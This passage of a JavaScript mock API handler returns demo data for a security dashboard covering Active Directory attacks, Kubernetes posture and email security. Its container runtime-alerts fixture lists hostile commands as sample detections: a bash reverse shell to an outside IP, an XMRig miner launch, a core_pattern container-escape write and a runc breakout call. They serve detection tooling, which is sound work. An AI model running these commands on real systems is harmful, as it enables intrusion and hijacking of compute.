  if (p === '/ad/timeline') return ok([{ id: 1, event_type: 'kerberos_ticket', severity: 'critical', source_user: 'svc_backup', source_computer: 'WS-ADMIN01', target: 'Multiple SPNs', description: 'Kerberoasting — 23 TGS tickets for RC4 SPNs in 4 minutes', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, event_type: 'dcsync', severity: 'critical', source_user: 'hcraig', source_computer: 'WS-INFECTED01', target: 'DC01.corp.local', description: 'DCSync via Mimikatz — replication request from non-DC workstation', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, event_type: 'admin_group_change', severity: 'critical', source_user: 'jsmith', source_computer: 'WS-ADMIN01', target: 'backdoor-admin → Domain Admins', description: 'New backdoor-admin account created and added to Domain Admins', created_at: new Date(Date.now() - 21600000).toISOString() }, { id: 4, event_type: 'lsass_access', severity: 'critical', source_user: 'SYSTEM', source_computer: 'WS-INFECTED01', target: 'lsass.exe', description: 'LSASS memory dump — Mimikatz credential harvesting', created_at: new Date(Date.now() - 9000000).toISOString() }, { id: 5, event_type: 'pass_the_hash', severity: 'critical', source_user: 'administrator', source_computer: 'WS-INFECTED01', target: 'FILE-SRV01, DC01', description: 'Lateral movement via Pass-the-Hash to 3 servers', created_at: new Date(Date.now() - 10800000).toISOString() }, { id: 6, event_type: 'failed_login', severity: 'high', source_user: 'administrator', source_computer: 'UNKNOWN', target: 'DC01.corp.local', description: '47 consecutive failed logins from external IP 192.168.100.47', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 7, event_type: 'gpo_change', severity: 'high', source_user: 'administrator', source_computer: 'DC01', target: 'Default Domain Policy', description: 'GPO modified — password complexity requirements reduced', created_at: new Date(Date.now() - 86400000).toISOString() }]);
  if (p === '/ad/graph') return ok({ nodes: [{ id: 'dc01', label: 'DC01.corp.local', type: 'domain_controller', risk: 85 }, { id: 'dc02', label: 'DC02.corp.local', type: 'domain_controller', risk: 72 }, { id: 'group-da', label: 'Domain Admins', type: 'group', risk: 90, members: 6 }, { id: 'group-ea', label: 'Enterprise Admins', type: 'group', risk: 95, members: 3 }, { id: 'user-admin', label: 'administrator', type: 'user', risk: 60 }, { id: 'user-jsmith', label: 'jsmith', type: 'user', risk: 82 }, { id: 'user-svcbak', label: 'svc_backup', type: 'service_account', risk: 97 }, { id: 'comp-ws01', label: 'WS-ADMIN01', type: 'computer', risk: 55 }, { id: 'comp-srv01', label: 'FILE-SRV01', type: 'computer', risk: 68 }, { id: 'gpo-default', label: 'Default Domain Policy', type: 'gpo', risk: 75 }], edges: [{ source: 'user-admin', target: 'group-da', label: 'memberOf', risk: 'critical' }, { source: 'user-jsmith', target: 'group-da', label: 'memberOf', risk: 'critical' }, { source: 'user-svcbak', target: 'group-da', label: 'memberOf', risk: 'critical' }, { source: 'group-da', target: 'dc01', label: 'AdminTo', risk: 'critical' }, { source: 'group-da', target: 'dc02', label: 'AdminTo', risk: 'critical' }, { source: 'group-ea', target: 'group-da', label: 'GenericAll', risk: 'critical' }, { source: 'user-jsmith', target: 'comp-ws01', label: 'AdminTo', risk: 'high' }, { source: 'comp-srv01', target: 'dc01', label: 'UnconstrainedDelegation', risk: 'critical' }, { source: 'gpo-default', target: 'dc01', label: 'AppliesTo', risk: 'high' }], stats: { users: 1247, computers: 184, dcs: 3 } });
  if (p === '/ad/analytics') return ok({ auth_trend: Array.from({ length: 14 }, (_, i) => ({ date: new Date(Date.now() - (13 - i) * 86400000).toISOString().split('T')[0], count: Math.floor(Math.random() * 80) + 20 })), total_attacks: 8, kerberoasting: 1, pass_the_hash: 1, dcsync_attempts: 1, priv_escalations: 1, new_admins_7d: 1, attack_breakdown: [{ type: 'Kerberoasting', count: 1 }, { type: 'Pass-the-Hash', count: 1 }, { type: 'DCSync', count: 1 }, { type: 'LSASS Dump', count: 1 }, { type: 'Golden Ticket', count: 1 }, { type: 'AS-REP Roast', count: 1 }, { type: 'New DA Account', count: 1 }, { type: 'PsExec', count: 1 }], top_failed_logins: [{ user: 'administrator', count: 47, source_ip: '192.168.100.47' }, { user: 'jsmith', count: 23, source_ip: '10.0.1.88' }, { user: 'svc_backup', count: 18, source_ip: '10.0.2.112' }, { user: 'hcraig', count: 11, source_ip: '192.168.50.22' }] });
  if (p === '/ad/assessment') return ok({ overall_score: 61, checks: [{ id: 'pwd_policy', title: 'Weak Password Policy', status: 'fail', severity: 'high', detail: 'Minimum password length is 8 characters; complexity not enforced on all OUs', remediation: 'Set minimum length to 14+ characters, enforce complexity, enable Fine-Grained Password Policies for privileged accounts' }, { id: 'inactive_privs', title: 'Inactive Privileged Accounts', status: 'fail', severity: 'high', detail: '4 admin accounts have not logged in for >90 days', remediation: 'Audit all privileged accounts quarterly; disable or delete stale admin accounts' }, { id: 'unconstrained_delegation', title: 'Unconstrained Delegation', status: 'fail', severity: 'critical', detail: '3 computers with unconstrained Kerberos delegation', remediation: 'Remove unconstrained delegation from all computers except DCs; use constrained delegation or RBCD instead' }, { id: 'ldap_signing', title: 'LDAP Signing Not Required', status: 'fail', severity: 'high', detail: 'DC does not require LDAP signing — vulnerable to LDAP relay attacks', remediation: "Set 'Domain Controller: LDAP server signing requirements' to 'Require signing' in Group Policy" }, { id: 'smb_signing', title: 'SMB Signing Disabled', status: 'fail', severity: 'high', detail: 'SMB signing not required on all servers — vulnerable to NTLM relay', remediation: "Enable 'Microsoft network server: Digitally sign communications (always)' in GPO" }, { id: 'excessive_groups', title: 'Excessive Group Memberships', status: 'fail', severity: 'medium', detail: 'Domain Admins group has 12 members; Enterprise Admins has 4 members', remediation: 'Reduce DA membership to minimum required; use tiered administration model' }, { id: 'stale_computers', title: 'Stale Computer Accounts', status: 'fail', severity: 'medium', detail: '6 computer accounts not authenticated in 180+ days', remediation: 'Disable or delete stale computer accounts; implement automated stale account cleanup' }, { id: 'password_never_expires', title: 'Password Never Expires', status: 'fail', severity: 'medium', detail: '47 accounts have Password Never Expires set', remediation: "Remove 'Password Never Expires' from all accounts except break-glass accounts" }, { id: 'protected_users', title: 'Protected Users Group', status: 'warn', severity: 'medium', detail: 'Only 2 of 12 Domain Admins are in Protected Users security group', remediation: 'Add all privileged accounts to Protected Users group to prevent NTLM, RC4, and unconstrained delegation' }, { id: 'privileged_access', title: 'Privileged Access Workstations', status: 'warn', severity: 'medium', detail: 'No PAW policy enforced — admins logging in from standard workstations', remediation: 'Implement Privileged Access Workstations (PAWs) for Tier-0 administration' }] });

  // ── Container Security / Kubernetes ──────────────────────────────────────
  if (p === '/containers/dashboard') return ok({ clusters: 3, nodes: 18, pods: 147, namespaces: 12, running_containers: 284, critical_findings: 8, vulnerable_images: 14, runtime_alerts: 6, container_risk_score: 74, compliance_score: 72, privileged_pods: 11, pods_no_limits: 23 });
  if (p === '/containers/clusters') return ok([{ id: 1, name: 'prod-eks-us-east-1', provider: 'aws', k8s_version: '1.29.4', node_count: 8, status: 'healthy', region: 'us-east-1', risk_score: 78, compliance_score: 68, last_scan: new Date(Date.now() - 1800000).toISOString(), created_at: '2024-01-15T00:00:00Z' }, { id: 2, name: 'staging-gke-us-central1', provider: 'gcp', k8s_version: '1.28.8', node_count: 4, status: 'healthy', region: 'us-central1', risk_score: 52, compliance_score: 81, last_scan: new Date(Date.now() - 3600000).toISOString(), created_at: '2024-03-01T00:00:00Z' }, { id: 3, name: 'dev-aks-eastus2', provider: 'azure', k8s_version: '1.27.13', node_count: 6, status: 'degraded', region: 'eastus2', risk_score: 61, compliance_score: 74, last_scan: new Date(Date.now() - 7200000).toISOString(), created_at: '2024-06-10T00:00:00Z' }]);
  if (p === '/containers/nodes') return ok([{ id: 1, cluster_id: 1, name: 'ip-10-0-1-45.ec2.internal', os: 'Amazon Linux 2023', kernel: '6.1.79-99.167.amzn2023.x86_64', cpu_cores: 8, memory_gb: 32, pod_count: 22, runtime: 'containerd 1.7.11', risk_score: 82, vuln_count: 4, status: 'ready', last_heartbeat: new Date(Date.now() - 30000).toISOString(), created_at: '2024-01-15T00:00:00Z' }, { id: 2, cluster_id: 1, name: 'ip-10-0-2-87.ec2.internal', os: 'Amazon Linux 2023', kernel: '6.1.79-99.167.amzn2023.x86_64', cpu_cores: 8, memory_gb: 32, pod_count: 18, runtime: 'containerd 1.7.11', risk_score: 76, vuln_count: 3, status: 'ready', last_heartbeat: new Date(Date.now() - 45000).toISOString(), created_at: '2024-01-15T00:00:00Z' }, { id: 3, cluster_id: 1, name: 'ip-10-0-3-112.ec2.internal', os: 'Amazon Linux 2023', kernel: '6.1.68-94.151.amzn2023.x86_64', cpu_cores: 16, memory_gb: 64, pod_count: 31, runtime: 'containerd 1.6.28', risk_score: 91, vuln_count: 7, status: 'ready', last_heartbeat: new Date(Date.now() - 60000).toISOString(), created_at: '2024-01-15T00:00:00Z' }, { id: 4, cluster_id: 2, name: 'gke-staging-pool-a-8f2c1d3e-7gx4', os: 'Container-Optimized OS 109', kernel: '6.1.58+', cpu_cores: 4, memory_gb: 16, pod_count: 14, runtime: 'containerd 1.7.13', risk_score: 45, vuln_count: 1, status: 'ready', last_heartbeat: new Date(Date.now() - 20000).toISOString(), created_at: '2024-03-01T00:00:00Z' }, { id: 5, cluster_id: 3, name: 'aks-devpool-17389274-vmss000000', os: 'Ubuntu 22.04.4 LTS', kernel: '6.2.0-1018-azure', cpu_cores: 4, memory_gb: 16, pod_count: 19, runtime: 'containerd 1.7.11', risk_score: 63, vuln_count: 2, status: 'ready', last_heartbeat: new Date(Date.now() - 40000).toISOString(), created_at: '2024-06-10T00:00:00Z' }, { id: 6, cluster_id: 3, name: 'aks-devpool-17389274-vmss000001', os: 'Ubuntu 22.04.4 LTS', kernel: '6.2.0-1018-azure', cpu_cores: 4, memory_gb: 16, pod_count: 21, runtime: 'containerd 1.7.11', risk_score: 58, vuln_count: 2, status: 'not_ready', last_heartbeat: new Date(Date.now() - 900000).toISOString(), created_at: '2024-06-10T00:00:00Z' }]);
  if (p === '/containers/namespaces') return ok([{ namespace: 'production', pod_count: 42, privileged_pods: 8, risk_score: 81 }, { namespace: 'kube-system', pod_count: 21, privileged_pods: 3, risk_score: 44 }, { namespace: 'monitoring', pod_count: 9, privileged_pods: 0, risk_score: 32 }, { namespace: 'staging', pod_count: 18, privileged_pods: 0, risk_score: 53 }, { namespace: 'ingress-nginx', pod_count: 4, privileged_pods: 0, risk_score: 61 }, { namespace: 'default', pod_count: 7, privileged_pods: 0, risk_score: 68 }, { namespace: 'cert-manager', pod_count: 3, privileged_pods: 0, risk_score: 28 }, { namespace: 'dev', pod_count: 23, privileged_pods: 0, risk_score: 47 }]);
  if (p === '/containers/pods') return ok([{ id: 1, cluster_id: 1, namespace: 'production', name: 'nginx-deployment-7d8f4b9c6-xk2mt', image: 'nginx:1.19', status: 'running', is_privileged: true, host_network: false, host_pid: false, host_ipc: false, run_as_root: true, read_only_fs: false, has_resource_limits: false, capabilities: 'NET_ADMIN,SYS_PTRACE', volumes: 'hostPath:/var/run/docker.sock,secret:db-creds', risk_score: 94, created_at: '2024-08-01T00:00:00Z' }, { id: 2, cluster_id: 1, namespace: 'production', name: 'api-server-5c7d8f9b6-p9qrs', image: 'webapp:1.2.3', status: 'running', is_privileged: false, host_network: true, host_pid: false, host_ipc: false, run_as_root: false, read_only_fs: true, has_resource_limits: true, capabilities: '', volumes: 'secret:api-keys,configMap:app-config', risk_score: 72, created_at: '2024-09-15T00:00:00Z' }, { id: 3, cluster_id: 1, namespace: 'kube-system', name: 'kube-proxy-7hxr4', image: 'registry.k8s.io/kube-proxy:v1.29.4', status: 'running', is_privileged: true, host_network: true, host_pid: false, host_ipc: false, run_as_root: false, read_only_fs: true, has_resource_limits: true, capabilities: 'NET_ADMIN,NET_RAW', volumes: 'hostPath:/run/xtables.lock,hostPath:/lib/modules', risk_score: 45, created_at: '2024-01-15T00:00:00Z' }, { id: 4, cluster_id: 1, namespace: 'production', name: 'redis-cache-0', image: 'redis:6.0', status: 'running', is_privileged: false, host_network: false, host_pid: false, host_ipc: false, run_as_root: false, read_only_fs: true, has_resource_limits: true, capabilities: '', volumes: 'persistentVolumeClaim:redis-data', risk_score: 58, created_at: '2024-07-20T00:00:00Z' }, { id: 5, cluster_id: 1, namespace: 'monitoring', name: 'prometheus-0', image: 'prom/prometheus:v2.47.0', status: 'running', is_privileged: false, host_network: false, host_pid: false, host_ipc: false, run_as_root: false, read_only_fs: false, has_resource_limits: true, capabilities: '', volumes: 'persistentVolumeClaim:prometheus-data,configMap:prometheus-config', risk_score: 31, created_at: '2024-04-10T00:00:00Z' }, { id: 6, cluster_id: 2, namespace: 'default', name: 'debug-pod-xyz123', image: 'ubuntu:latest', status: 'running', is_privileged: true, host_network: true, host_pid: true, host_ipc: true, run_as_root: true, read_only_fs: false, has_resource_limits: false, capabilities: 'ALL', volumes: 'hostPath:/', risk_score: 99, created_at: new Date(Date.now() - 86400000).toISOString() }]);
  if (p === '/containers/images') return ok([{ id: 1, image: 'nginx', registry: 'docker.io', tag: '1.19', base_image: 'debian:10-slim', os: 'Debian 10', size_mb: 133, cve_critical: 4, cve_high: 12, cve_medium: 28, cve_low: 47, has_secrets: false, malware_found: false, signature_valid: false, sbom_available: false, age_days: 842, risk_score: 94, last_scanned: new Date(Date.now() - 7200000).toISOString(), created_at: '2024-01-15T00:00:00Z' }, { id: 2, image: 'webapp', registry: 'ghcr.io', tag: '1.2.3', base_image: 'node:18-alpine', os: 'Alpine 3.18', size_mb: 287, cve_critical: 1, cve_high: 6, cve_medium: 14, cve_low: 22, has_secrets: true, malware_found: false, signature_valid: true, sbom_available: true, age_days: 45, risk_score: 78, last_scanned: new Date(Date.now() - 3600000).toISOString(), created_at: '2024-05-01T00:00:00Z' }, { id: 3, image: 'redis', registry: 'docker.io', tag: '6.0', base_image: 'debian:11-slim', os: 'Debian 11', size_mb: 113, cve_critical: 2, cve_high: 8, cve_medium: 19, cve_low: 31, has_secrets: false, malware_found: false, signature_valid: false, sbom_available: false, age_days: 410, risk_score: 87, last_scanned: new Date(Date.now() - 14400000).toISOString(), created_at: '2024-03-01T00:00:00Z' }, { id: 4, image: 'ubuntu', registry: 'docker.io', tag: 'latest', base_image: 'ubuntu:22.04', os: 'Ubuntu 22.04', size_mb: 77, cve_critical: 0, cve_high: 3, cve_medium: 9, cve_low: 18, has_secrets: false, malware_found: false, signature_valid: false, sbom_available: false, age_days: 0, risk_score: 55, last_scanned: new Date(Date.now() - 1800000).toISOString(), created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 5, image: 'api-backend', registry: 'gcr.io', tag: '2.8.1', base_image: 'golang:1.21-alpine', os: 'Alpine 3.18', size_mb: 42, cve_critical: 0, cve_high: 0, cve_medium: 2, cve_low: 5, has_secrets: false, malware_found: false, signature_valid: true, sbom_available: true, age_days: 12, risk_score: 22, last_scanned: new Date(Date.now() - 3600000).toISOString(), created_at: '2026-06-01T00:00:00Z' }, { id: 6, image: 'alpine', registry: 'docker.io', tag: '3.14', base_image: 'alpine:3.14', os: 'Alpine 3.14', size_mb: 7, cve_critical: 2, cve_high: 4, cve_medium: 6, cve_low: 8, has_secrets: false, malware_found: true, signature_valid: false, sbom_available: false, age_days: 1095, risk_score: 91, last_scanned: new Date(Date.now() - 28800000).toISOString(), created_at: '2021-06-01T00:00:00Z' }]);
  if (p === '/containers/supply-chain') return ok({ total_images: 6, signed_images: 2, sbom_available: 2, old_base_images: 3, signature_rate: 33, sbom_rate: 33, trusted_registries: [{ registry: 'gcr.io', trusted: true, images: 2 }, { registry: 'ghcr.io', trusted: true, images: 1 }, { registry: 'docker.io', trusted: false, images: 4 }, { registry: 'public.ecr.aws', trusted: true, images: 0 }] });
  if (p === '/containers/runtime-alerts') return ok([{ id: 1, cluster_id: 1, namespace: 'production', pod_name: 'nginx-deployment-7d8f4b9c6-xk2mt', container_name: 'nginx', alert_type: 'reverse_shell', severity: 'critical', description: 'Reverse shell spawned from nginx container — outbound TCP to 185.220.101.47:4444', process: 'bash', command: 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1', source_ip: '185.220.101.47', mitre_technique: 'T1059.004', status: 'open', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, cluster_id: 1, namespace: 'default', pod_name: 'debug-pod-xyz123', container_name: 'ubuntu', alert_type: 'crypto_mining', severity: 'critical', description: 'XMRig crypto miner detected — CPU usage 98%, outbound traffic to xmrig.com', process: 'xmrig', command: './xmrig --pool xmrig.com:3333 --user wallet123', source_ip: '45.129.33.17', mitre_technique: 'T1496', status: 'open', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, cluster_id: 1, namespace: 'production', pod_name: 'api-server-5c7d8f9b6-p9qrs', container_name: 'api', alert_type: 'privilege_escalation', severity: 'high', description: 'Container attempted to write to /proc/sys/kernel/core_pattern — possible container escape', process: 'sh', command: 'echo "| /bin/bash -c \\"bash -i ...\\"" > /proc/sys/kernel/core_pattern', source_ip: '', mitre_technique: 'T1611', status: 'open', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 4, cluster_id: 2, namespace: 'staging', pod_name: 'staging-api-6d7f8b9c5-m3nop', container_name: 'api', alert_type: 'file_tampering', severity: 'medium', description: 'Binary replacement detected — /usr/bin/python3 modified on read-only filesystem', process: 'cp', command: 'cp /tmp/.bin/python3 /usr/bin/python3', source_ip: '', mitre_technique: 'T1565.001', status: 'investigating', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 5, cluster_id: 1, namespace: 'kube-system', pod_name: 'kube-proxy-7hxr4', container_name: 'kube-proxy', alert_type: 'unexpected_network', severity: 'low', description: 'Unexpected outbound connection to external IP on non-standard port', process: 'kube-proxy', command: '', source_ip: '91.108.4.233', mitre_technique: 'T1071.001', status: 'resolved', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 6, cluster_id: 3, namespace: 'dev', pod_name: 'dev-worker-8c9d7e6f5-q8rst', container_name: 'worker', alert_type: 'container_escape', severity: 'critical', description: 'CVE-2024-21626 exploitation attempt — runc workdir breakout via relative path traversal', process: 'runc', command: 'runc --root /tmp/runc run pwn', source_ip: '', mitre_technique: 'T1611', status: 'open', created_at: new Date(Date.now() - 1800000).toISOString() }]);
  if (p === '/containers/rbac') return ok({ findings: [{ id: 1, cluster_id: 1, kind: 'ClusterRoleBinding', name: 'jenkins-cluster-admin', namespace: 'ALL', subject: 'jenkins', permissions: '*,*,*', finding_type: 'wildcard_permissions', severity: 'critical', description: 'Service account jenkins has cluster-admin via ClusterRoleBinding — full cluster access', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, cluster_id: 1, kind: 'ClusterRoleBinding', name: 'default-sa-editor', namespace: 'ALL', subject: 'default', permissions: 'get,list,watch,create,update,patch,delete', finding_type: 'excessive_permissions', severity: 'high', description: 'Default service account bound to cluster-level editor role — overly permissive', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 3, cluster_id: 1, kind: 'ClusterRole', name: 'secret-reader-cluster', namespace: 'ALL', subject: 'monitoring', permissions: 'get,list,watch secrets', finding_type: 'sensitive_resource_access', severity: 'high', description: 'Cluster-wide secret read access granted to monitoring service account', created_at: new Date(Date.now() - 14400000).toISOString() }, { id: 4, cluster_id: 2, kind: 'RoleBinding', name: 'dev-pod-exec', namespace: 'staging', subject: 'dev-team', permissions: 'create pods/exec', finding_type: 'lateral_movement_risk', severity: 'medium', description: 'Dev team can exec into staging pods — lateral movement risk if staging shares secrets', created_at: new Date(Date.now() - 28800000).toISOString() }], total: 4, cluster_roles: 2, bindings: 2, excessive: 2, wildcard: 1 });
  if (p === '/containers/secrets') return ok({ total_secrets: 12, plaintext: 2, expired: 1, exposed: 3, providers: [{ name: 'Kubernetes Secrets', count: 12, status: 'active' }, { name: 'Vault', count: 0, status: 'not_configured' }, { name: 'AWS Secrets Manager', count: 0, status: 'not_configured' }, { name: 'Azure Key Vault', count: 0, status: 'not_configured' }, { name: 'GCP Secret Manager', count: 0, status: 'not_configured' }] });
  if (p === '/containers/network-policies') return ok([{ id: 1, cluster_id: 1, namespace: 'production', name: 'deny-all-ingress', policy_type: 'ingress', direction: 'ingress', status: 'active', pod_selector: '{}', peer: 'deny-all', port: 'all', created_at: '2024-02-01T00:00:00Z' }, { id: 2, cluster_id: 1, namespace: 'production', name: 'allow-api-ingress', policy_type: 'ingress', direction: 'ingress', status: 'active', pod_selector: 'app=api-server', peer: 'ingress-nginx', port: '8080/TCP', created_at: '2024-02-01T00:00:00Z' }, { id: 3, cluster_id: 1, namespace: 'production', name: 'allow-redis-from-api', policy_type: 'ingress', direction: 'ingress', status: 'active', pod_selector: 'app=redis', peer: 'app=api-server', port: '6379/TCP', created_at: '2024-03-15T00:00:00Z' }, { id: 4, cluster_id: 1, namespace: 'default', name: 'NONE', policy_type: 'none', direction: 'none', status: 'missing', pod_selector: 'ALL', peer: 'any', port: 'any', created_at: '' }, { id: 5, cluster_id: 2, namespace: 'staging', name: 'allow-all', policy_type: 'ingress', direction: 'ingress', status: 'warn', pod_selector: '{}', peer: 'any', port: 'any', created_at: '2024-04-01T00:00:00Z' }]);
  if (p === '/containers/admission') return ok([{ id: 1, cluster_id: 1, namespace: 'production', workload: 'nginx-deployment', kind: 'Deployment', violation_type: 'privileged_container', severity: 'critical', description: 'Deployment requests privileged: true — denied by PodSecurity admission', action: 'allowed_pre_policy', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 2, cluster_id: 1, namespace: 'default', workload: 'debug-pod', kind: 'Pod', violation_type: 'disallowed_image_registry', severity: 'high', description: 'Image docker.io/ubuntu:latest not from approved registry', action: 'allowed', created_at: new Date(Date.now() - 86400000).toISOString() }, { id: 3, cluster_id: 2, namespace: 'staging', workload: 'load-tester', kind: 'Deployment', violation_type: 'missing_resource_limits', severity: 'medium', description: 'Container missing CPU and memory limits', action: 'allowed_with_warning', created_at: new Date(Date.now() - 172800000).toISOString() }, { id: 4, cluster_id: 1, namespace: 'production', workload: 'secret-scanner', kind: 'Job', violation_type: 'host_path_mount', severity: 'high', description: 'Job mounts hostPath / — full filesystem access', action: 'denied', created_at: new Date(Date.now() - 7200000).toISOString() }]);
  if (p === '/containers/compliance') return ok({ overall_score: 72, frameworks: [{ name: 'CIS Kubernetes Benchmark', score: 72, passed: 87, failed: 34, total: 121, version: '1.8' }, { name: 'NSA Kubernetes Hardening', score: 68, passed: 41, failed: 19, total: 60, version: '1.2' }, { name: 'PCI DSS', score: 81, passed: 22, failed: 5, total: 27, version: '4.0' }, { name: 'NIST SP 800-190', score: 74, passed: 31, failed: 11, total: 42, version: '1.0' }, { name: 'ISO 27001', score: 79, passed: 38, failed: 10, total: 48, version: '2022' }], failed_controls: [{ control: 'CIS 4.2.6', title: 'Minimize the admission of root containers', severity: 'high', framework: 'CIS' }, { control: 'CIS 5.2.2', title: 'Minimize the admission of privileged containers', severity: 'critical', framework: 'CIS' }, { control: 'CIS 5.7.4', title: 'The default namespace should not be used', severity: 'medium', framework: 'CIS' }, { control: 'NSA-5', title: 'Enable audit logging for Kubernetes API server', severity: 'high', framework: 'NSA' }, { control: 'NSA-8', title: 'Network policies should restrict all ingress', severity: 'high', framework: 'NSA' }, { control: 'PCI-2.2', title: 'Container images must be from approved registries', severity: 'high', framework: 'PCI DSS' }] });
  if (p === '/containers/threat-intel') return ok({ malicious_images: [{ image: 'alpine:3.14', reason: 'Known crypto mining tool embedded (XMRig)', hits: 3, cve: 'CVE-2023-28432' }, { image: 'ubuntu:20.04', reason: 'Base image with known Log4Shell attack vector', hits: 1, cve: 'CVE-2021-44228' }], threat_actors: [{ actor: 'TeamTNT', campaigns: 2, target: 'Kubernetes clusters', ttps: 'T1525,T1496,T1611' }, { actor: 'Kinsing', campaigns: 1, target: 'Misconfigured Docker API', ttps: 'T1496,T1059.004' }], ioc_matches: [{ type: 'ip', value: '185.220.101.47', hits: 4, category: 'c2_server' }, { type: 'domain', value: 'xmrig.com', hits: 2, category: 'crypto_mining' }, { type: 'image', value: 'docker.io/xmrig/xmrig', hits: 1, category: 'crypto_miner' }], recent_cves: [{ cve: 'CVE-2024-21626', score: 9.9, affected: 'runc < 1.1.12', type: 'container_escape' }, { cve: 'CVE-2023-2431', score: 7.8, affected: 'kubelet', type: 'privilege_escalation' }, { cve: 'CVE-2022-3172', score: 7.5, affected: 'kube-aggregator', type: 'ssrf' }], malware_families: [{ family: 'XMRig', count: 5, category: 'crypto_miner' }, { family: 'Doki', count: 1, category: 'backdoor' }] });
  if (p === '/containers/timeline') return ok([{ id: 6, namespace: 'dev', pod_name: 'dev-worker-8c9d7e6f5-q8rst', event_type: 'container_escape', severity: 'critical', description: 'CVE-2024-21626 exploitation attempt detected — runc workdir breakout', created_at: new Date(Date.now() - 1800000).toISOString() }, { id: 1, namespace: 'production', pod_name: 'nginx-deployment-7d8f4b9c6-xk2mt', event_type: 'reverse_shell', severity: 'critical', description: 'Reverse shell spawned — outbound TCP to known C2 server', created_at: new Date(Date.now() - 300000).toISOString() }, { id: 2, namespace: 'default', pod_name: 'debug-pod-xyz123', event_type: 'crypto_mining', severity: 'critical', description: 'XMRig miner process detected — full CPU utilization', created_at: new Date(Date.now() - 900000).toISOString() }, { id: 3, namespace: 'production', pod_name: 'api-server-5c7d8f9b6-p9qrs', event_type: 'privilege_escalation', severity: 'high', description: 'Write to /proc/sys/kernel/core_pattern attempted', created_at: new Date(Date.now() - 3600000).toISOString() }, { id: 4, namespace: 'staging', pod_name: 'staging-api-6d7f8b9c5-m3nop', event_type: 'file_tampering', severity: 'medium', description: 'Binary modified on read-only filesystem', created_at: new Date(Date.now() - 7200000).toISOString() }, { id: 5, namespace: 'kube-system', pod_name: 'kube-proxy-7hxr4', event_type: 'unexpected_network', severity: 'low', description: 'Unexpected outbound connection to external IP', created_at: new Date(Date.now() - 86400000).toISOString() }]);
  if (p === '/containers/vulnerabilities') return ok([{ id: 1, image: 'nginx:1.19', cve_critical: 4, cve_high: 12, cve_medium: 28, cve_low: 47, risk_score: 94, last_scanned: new Date(Date.now() - 7200000).toISOString() }, { id: 6, image: 'alpine:3.14', cve_critical: 2, cve_high: 4, cve_medium: 6, cve_low: 8, risk_score: 91, last_scanned: new Date(Date.now() - 28800000).toISOString() }, { id: 3, image: 'redis:6.0', cve_critical: 2, cve_high: 8, cve_medium: 19, cve_low: 31, risk_score: 87, last_scanned: new Date(Date.now() - 14400000).toISOString() }, { id: 2, image: 'webapp:1.2.3', cve_critical: 1, cve_high: 6, cve_medium: 14, cve_low: 22, risk_score: 78, last_scanned: new Date(Date.now() - 3600000).toISOString() }, { id: 4, image: 'ubuntu:latest', cve_critical: 0, cve_high: 3, cve_medium: 9, cve_low: 18, risk_score: 55, last_scanned: new Date(Date.now() - 1800000).toISOString() }]);
  if (p === '/containers/attack-paths') return ok({ nodes: [{ id: 'internet', label: 'Internet', type: 'source', risk: 100 }, { id: 'ingress', label: 'Ingress Controller', type: 'network', namespace: 'ingress-nginx', risk: 75 }, { id: 'pod-web', label: 'nginx Pod', type: 'pod', namespace: 'production', image: 'nginx:1.19', risk: 94 }, { id: 'sa-web', label: 'default ServiceAccount', type: 'service_account', permissions: 'get,list,watch,create,update,patch,delete', risk: 91 }, { id: 'k8s-api', label: 'Kubernetes API', type: 'api_server', risk: 95 }, { id: 'secret-db', label: 'db-credentials', type: 'secret', namespace: 'production', risk: 90 }, { id: 'secret-aws', label: 'aws-keys', type: 'secret', namespace: 'production', risk: 88 }, { id: 'cluster-admin', label: 'ClusterAdmin', type: 'rbac_role', risk: 100 }], edges: [{ source: 'internet', target: 'ingress', label: 'HTTP/HTTPS', risk: 'high' }, { source: 'ingress', target: 'pod-web', label: 'routes to', risk: 'medium' }, { source: 'pod-web', target: 'sa-web', label: 'uses SA', risk: 'high' }, { source: 'sa-web', target: 'k8s-api', label: 'API calls', risk: 'critical' }, { source: 'k8s-api', target: 'secret-db', label: 'reads secret', risk: 'critical' }, { source: 'k8s-api', target: 'secret-aws', label: 'reads secret', risk: 'critical' }, { source: 'k8s-api', target: 'cluster-admin', label: 'privilege escalation', risk: 'critical' }] });
  if (p === '/containers/analytics') return ok({ total_pods: 147, privileged_pods: 11, runtime_alert_trend: Array.from({ length: 14 }, (_, i) => ({ date: new Date(Date.now() - (13 - i) * 86400000).toISOString().split('T')[0], count: Math.floor(Math.random() * 8) + 1 })), top_vulnerable_images: [{ image: 'nginx:1.19', cve_critical: 4, cve_high: 12, risk: 94 }, { image: 'redis:6.0', cve_critical: 2, cve_high: 8, risk: 87 }, { image: 'webapp:1.2.3', cve_critical: 1, cve_high: 6, risk: 78 }], alert_by_type: [{ type: 'reverse_shell', count: 2 }, { type: 'crypto_mining', count: 3 }, { type: 'container_escape', count: 2 }, { type: 'privilege_escalation', count: 1 }, { type: 'file_tampering', count: 4 }, { type: 'unexpected_network', count: 6 }], namespace_risk: [{ namespace: 'production', risk: 81, pods: 42 }, { namespace: 'default', risk: 68, pods: 7 }, { namespace: 'staging', risk: 53, pods: 18 }, { namespace: 'kube-system', risk: 44, pods: 21 }, { namespace: 'monitoring', risk: 32, pods: 9 }] });

  // ── Email Security Enterprise ─────────────────────────────────────────────
  if (p === '/email/dashboard') return ok({ emails_processed: 48312, emails_delivered: 47065, emails_blocked: 1247, phishing_attempts: 834, malware_attachments: 289, bec_attempts: 124, spam_rate: 14, url_clicks: 47, high_risk_users: 8, email_security_score: 87 });
